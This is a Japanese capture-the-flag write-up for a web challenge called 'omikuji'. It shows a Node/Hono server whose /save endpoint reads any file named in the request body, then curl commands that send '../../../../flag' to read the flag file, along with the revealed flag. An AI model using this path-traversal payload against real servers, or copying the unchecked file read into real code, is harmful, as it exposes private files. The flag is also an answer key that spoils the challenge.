# omikuji

> カフェドマンシー
>
> ヒント：フラグはappサーバの/flagにあります。配布ファイルのapp/server.jsをよく読んでみましょう。
>
> http://34.170.146.252:40060

[omikuji.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/c7bd4f1b-f0a6-48a1-bee5-30233ef879b7/omikuji.tar.gz)

server.js
```js
import { serve } from '@hono/node-server'
import { serveStatic } from '@hono/node-server/serve-static'
import { Hono } from 'hono'
import { html } from 'hono/html'
import { readFile, writeFile } from 'node:fs/promises'

function randomString() {
  return Math.floor(Math.random() * 4294967296).toString(16)
}

async function getResultContent(type) {
  return await readFile(`${import.meta.dirname}/${type}`, 'utf-8')
}

const app = new Hono()

app.use('/*', serveStatic({ root: './public' }))

app.get('/draw', async c => {
  const candidates = ['daikichi', 'kyo']
  const resultType = candidates[Math.floor(Math.random() * candidates.length)]
  const resultContent = await getResultContent(resultType)
  return c.json({
    type: resultType,
    content: resultContent
  })
})

app.post('/save', async c => {
  const type = await c.req.text()
  const content = await getResultContent(type)
  const filename = randomString()
  await writeFile(`${import.meta.dirname}/public/result/${filename}.html`, html`
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Result</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/light.css">
</head>
<body>
    <pre>${content}</pre>
    <a href="/">Back to Top</a>
</body>
</html>
  `)
  return c.json({
    location: `/result/${filename}.html`
  })
})

const port = 3000
console.log(`Server is running on port ${port}`)

serve({
  fetch: app.fetch,
  port
})
```

```js
async function getResultContent(type) {
  return await readFile(`${import.meta.dirname}/${type}`, 'utf-8')
}
```

```js
app.post('/save', async c => {
  const type = await c.req.text()
  const content = await getResultContent(type)
  const filename = randomString()
  await writeFile(`${import.meta.dirname}/public/result/${filename}.html`, html`
```

`/save`にパストラバーサルの脆弱性がある。
`/flag`を読み取れる。

```
> curl -X POST \
  -H "Content-Type: text/plain" \
  --data "../../../../flag" \
  http://34.170.146.252:40060/save
{"location":"/result/fcfaf349.html"}

> curl http://34.170.146.252:40060/result/fcfaf349.html

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Result</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/light.css">
</head>
<body>
    <pre>TSGLIVE{1_knew_at_f1rst_g1ance_that_1t_was_so_0rdin4ry_path_traversal}
</pre>
    <a href="/">Back to Top</a>
</body>
</html>
```

flag: `TSGLIVE{1_knew_at_f1rst_g1ance_that_1t_was_so_0rdin4ry_path_traversal}`
